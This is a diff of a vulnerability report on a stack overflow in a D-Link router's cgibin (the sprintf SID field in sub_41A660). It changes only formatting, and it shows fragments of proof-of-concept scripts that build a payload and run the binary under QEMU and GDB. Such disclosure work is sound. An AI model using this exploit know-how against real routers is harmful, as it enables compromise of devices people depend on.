@@ -10,6 +10,7 @@ Firmware Download URL:[https://tsd.dlink.com.tw/ddwn/](https://support.dlink.com
 Affected Component:
 
 affected source code file :cgibin
+
 affected function : genacgi_main/sub_41A660
 
 Vulnerability Details
@@ -26,7 +27,7 @@ Control the REQUEST_METHOD and REQUEST_URI to enter the sub_41A660 function：
 
 In the sub_41A660 function, stack overflow is achieved by manipulating SID as the v2 field of the sprintf function：
 
-'''
+```
 #python new.py
 # -*- coding: utf-8 -*-
 import sys
@@ -67,8 +68,8 @@ def create_payload():
     print("Base64 payload saved to payload_base64.txt")
 if __name__ == '__main__':
     create_payload()
-'''
-'''
+```
+```
 #run_exploit.py
 import os
 import base64
@@ -100,6 +101,6 @@ cmd = ["qemu-mipsel-static", "-L", "./", "-0", "gena.cgi", "./htdocs/cgibin"]
 print(f"[*] Sending payload of length {len(payload)}...")
 print("[*] GDB server listening on port 1234...")
 subprocess.run(cmd, env=binary_env, input=b"") 
-'''
+```
 
 Attack:
